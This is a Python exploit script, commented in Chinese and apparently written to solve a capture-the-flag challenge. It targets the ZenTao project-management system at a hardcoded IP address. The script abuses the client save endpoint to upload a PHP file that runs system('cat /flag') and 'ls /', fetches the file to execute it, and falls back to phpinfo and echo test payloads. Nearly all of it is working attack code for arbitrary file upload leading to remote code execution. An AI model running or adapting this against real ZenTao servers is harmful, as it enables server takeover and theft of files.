#!/usr/bin/env python3
"""
禅道漏洞 - 使用原始二进制上传
根据用户提示的 payload 格式
"""

import requests
import base64

requests.packages.urllib3.disable_warnings()

def upload_raw_binary():
    """使用原始二进制数据上传（直接 POST base64 解码后的内容）"""
    base_url = "http://47.113.178.182:32829"

    print("""
╔═══════════════════════════════════════════════════════════════╗
║      禅道漏洞 - 原始二进制上传测试                           ║
╚═══════════════════════════════════════════════════════════════╝
    """)

    # Payload from user hint
    # 原始 PHP: <?php echo "---SUCCESS---"; system('cat /flag'); system('ls /'); ?>
    payload_base64 = "PD9waHAgZWNobyAiLS0tU1VDQ0VTUy0tLSI7IHN5c3RlbSgnY2F0IC9mbGFnJyk7IHN5c3RlbSgnbHMgLycpOyA/Pg=="

    # 解码 base64 得到原始 PHP 代码
    payload_raw = base64.b64decode(payload_base64)

    print(f"[*] Payload (解码后): {payload_raw.decode()}")
    print(f"[*] Payload 长度: {len(payload_raw)} bytes")

    filename = "getflag.php"
    upload_url = f"{base_url}/zentao/index.php?m=client&f=save&t=txt&fileName={filename}"

    print(f"\n[*] 上传 URL: {upload_url}")

    try:
        # 方法 1: POST 解码后的原始数据（不是 base64 字符串）
        print("\n[方法 1] POST 原始二进制数据")
        resp = requests.post(
            upload_url,
            data=payload_raw,
            headers={'Content-Type': 'application/octet-stream'},
            timeout=10
        )
        print(f"    上传状态: {resp.status_code}")

        # 访问上传的文件
        file_url = f"{base_url}/zentao/data/client/1/{filename}"
        print(f"    访问: {file_url}")

        resp = requests.get(file_url, timeout=10)
        print(f"    响应状态: {resp.status_code}")
        print(f"    响应长度: {len(resp.content)} bytes")

        if resp.text.strip():
            print(f"\n    ✓ 有输出!")
            print("    " + "=" * 66)
            print(f"    {resp.text}")
            print("    " + "=" * 66)

            if "---SUCCESS---" in resp.text:
                print("\n    ✓✓✓ Payload 执行成功!")

                if "flag{" in resp.text.lower() or "ctf{" in resp.text.lower():
                    print("    ✓✓✓ 找到 Flag!")
                    return resp.text

        else:
            print("    ✗ 无输出")

    except Exception as e:
        print(f"    ✗ 错误: {e}")

    # 方法 2: POST base64 字符串（服务器端解码）
    print("\n[方法 2] POST base64 字符串")
    try:
        resp = requests.post(
            upload_url,
            data=payload_base64,
            headers={'Content-Type': 'text/plain'},
            timeout=10
        )
        print(f"    上传状态: {resp.status_code}")

        file_url = f"{base_url}/zentao/data/client/1/{filename}"
        resp = requests.get(file_url, timeout=10)
        print(f"    响应状态: {resp.status_code}")
        print(f"    响应长度: {len(resp.content)} bytes")

        if resp.text.strip():
            print(f"\n    ✓ 有输出!")
            print("    " + "=" * 66)
            print(f"    {resp.text}")
            print("    " + "=" * 66)

            if "---SUCCESS---" in resp.text:
                print("\n    ✓✓✓ Payload 执行成功!")

                if "flag{" in resp.text.lower() or "ctf{" in resp.text.lower():
                    print("    ✓✓✓ 找到 Flag!")
                    return resp.text
        else:
            print("    ✗ 无输出")

    except Exception as e:
        print(f"    ✗ 错误: {e}")

    return None


def try_simpler_payloads():
    """尝试更简单的 payload 看看能否执行"""
    base_url = "http://47.113.178.182:32829"

    print("\n" + "=" * 70)
    print("尝试简单 payload 测试 PHP 执行")
    print("=" * 70)

    test_payloads = [
        ("test_echo.php", b"<?php echo 'HELLO'; ?>"),
        ("test_phpinfo.php", b"<?php phpinfo(); ?>"),
        ("test_time.php", b"<?php echo time(); ?>"),
    ]

    for filename, payload in test_payloads:
        print(f"\n[*] 测试: {filename}")
        print(f"    Payload: {payload.decode()}")

        upload_url = f"{base_url}/zentao/index.php?m=client&f=save&t=txt&fileName={filename}"

        # 尝试两种方式
        for method in ["raw", "base64"]:
            if method == "raw":
                data = payload
            else:
                data = base64.b64encode(payload).decode()

            try:
                requests.post(upload_url, data=data, timeout=10)

                file_url = f"{base_url}/zentao/data/client/1/{filename}"
                resp = requests.get(file_url, timeout=10)

                if resp.text.strip():
                    print(f"    ✓ [{method}] 成功! 输出: {resp.text[:50]}")
                    return True

            except Exception as e:
                pass

    print("\n[-] 所有简单测试都失败")
    return False


def main():
    # 上传主 payload
    result = upload_raw_binary()

    if not result:
        # 测试基础 PHP 执行
        if try_simpler_payloads():
            print("\n[*] PHP 可以执行，但主 payload 失败")
            print("[*] 可能是命令执行函数被禁用")
        else:
            print("\n[*] PHP 似乎完全无法执行")
            print("[*] 可能:")
            print("    1. 上传的文件内容为空")
            print("    2. PHP 文件不被解析")
            print("    3. 需要特殊的上传格式")


if __name__ == "__main__":
    main()
